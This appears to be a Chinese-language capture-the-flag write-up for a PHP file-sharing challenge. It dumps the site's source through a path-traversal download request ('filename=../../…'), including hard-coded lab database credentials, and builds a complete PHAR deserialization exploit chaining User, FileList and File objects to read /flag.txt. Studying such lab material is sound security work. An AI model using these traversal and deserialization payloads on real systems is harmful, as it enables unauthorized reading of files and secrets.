![[Pasted image 20221230084855.png|500]]

---
```php
/login.php
```

![[Pasted image 20221230084912.png]]

```php
/register.php
```

![[Pasted image 20221230085417.png]]

尝试注册一个账号

![[Pasted image 20221230090058.png]]

进入管理面板`/index.php`，可以进行文件上传

![[Pasted image 20221230090437.png]]

文件的下载通过向`/download.php` `POST`文件名实现

文件的删除通过对`/delete.php`的`POST`实现

尝试下载源码
```http
filename=../../login.php
```

成功获取到`login.php`，截取主体部分
```php
<?php
session_start();
if (isset($_SESSION['login'])) {
    header("Location: index.php");
    die();
}
?>
<?php
include "class.php";

if (isset($_GET['register'])) {
    echo "<script>toast('注册成功', 'info');</script>";
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
    $u = new User();
    $username = (string) $_POST["username"];
    $password = (string) $_POST["password"];
    if (strlen($username) < 20 && $u->verify_user($username, $password)) {
        $_SESSION['login'] = true;
        $_SESSION['username'] = htmlentities($username);
        $sandbox = "uploads/" . sha1($_SESSION['username'] . "sftUahRiTz") . "/";
        if (!is_dir($sandbox)) {
            mkdir($sandbox);
        }
        $_SESSION['sandbox'] = $sandbox;
        echo("<script>window.location.href='index.php';</script>");
        die();
    }
    echo "<script>toast('账号或密码错误', 'warning');</script>";
}
?>
```

```http
filename=../../register.php
```

```php
<?php
session_start();
if (isset($_SESSION['login'])) {
    header("Location: index.php");
    die();
}
?>
<?php
include "class.php";

if (isset($_POST["username"]) && isset($_POST["password"])) {
    $u = new User();
    $username = (string) $_POST["username"];
    $password = (string) $_POST["password"];
    if (strlen($username) < 20 && strlen($username) > 2 && strlen($password) > 1) {
        if ($u->add_user($username, $password)) {
            echo("<script>window.location.href='login.php?register';</script>");
            die();
        } else {
            echo "<script>toast('此用户名已被使用', 'warning');</script>";
            die();
        }
    }
    echo "<script>toast('请输入有效用户名和密码', 'warning');</script>";
}
?>
```

```http
filename=../../index.php
```

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}
?>
<?php
include "class.php";

$a = new FileList($_SESSION['sandbox']);
$a->Name();
$a->Size();
?>
```

```http
filename=../../upload.php
```

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

include "class.php";

if (isset($_FILES["file"])) {
    $filename = $_FILES["file"]["name"];
    $pos = strrpos($filename, ".");
    if ($pos !== false) {
        $filename = substr($filename, 0, $pos);
    }
    
    $fileext = ".gif";
    switch ($_FILES["file"]["type"]) {
        case 'image/gif':
            $fileext = ".gif";
            break;
        case 'image/jpeg':
            $fileext = ".jpg";
            break;
        case 'image/png':
            $fileext = ".png";
            break;
        default:
            $response = array("success" => false, "error" => "Only gif/jpg/png allowed");
            Header("Content-type: application/json");
            echo json_encode($response);
            die();
    }

    if (strlen($filename) < 40 && strlen($filename) !== 0) {
        $dst = $_SESSION['sandbox'] . $filename . $fileext;
        move_uploaded_file($_FILES["file"]["tmp_name"], $dst);
        $response = array("success" => true, "error" => "");
        Header("Content-type: application/json");
        echo json_encode($response);
    } else {
        $response = array("success" => false, "error" => "Invaild filename");
        Header("Content-type: application/json");
        echo json_encode($response);
    }
}
?>
```

```http
filename=../../download.php
```

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";
ini_set("open_basedir", getcwd() . ":/etc:/tmp");

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
} else {
    echo "File not exist";
}
?>
```

```http
filename=../../delete.php
```

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```

```http
filename=../../class.php
```

```php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>
```

然后就是日常的学习时间QwQ

[PHAR与反序列化](https://www.anquanke.com/post/id/245621)

`/delete.php`并未过滤`phar`协议，可以利用这一点触发反序列化。

通过`File.close`来实现对`flag`文件的读取，然而需要一个地方输出。

观察到`FileList`类定义了`__call`方法以实现对多个`File`对象的方法调用和结果储存，并能在析构时对储存的结果进行输出，因此问题转换为调用`Filelist.close`。

又注意到`User`类在析构时调用`db`的`close`方法，因而只须令`db`为`FileList`即可。

```php
<?php
class User {
	public $db;
    public function __construct() {
        $this->db = new FileList();
    }
}

class FileList {
	private $files;
	private $results;
	private $funcs;
    public function __construct() {
        $this->files = array(new File());
        $this->results = array();
        $this->funcs = array();
    }
}

class File {
	public $filename = '/flag.txt';
}

@unlink('phar.phar');
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");
$user = new User();
$phar->setMetadata($user);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```
~~然后折腾权限折腾半天，最后发现`systemd`里面有个`ProtectSystem=full`让`/usr`只读，刚好`web`根目录就在`/usr/share/nginx/html`~~

![[Pasted image 20221230130817.png]]

#Web #PHP #源码泄漏 #代码审计 #反序列化 #phar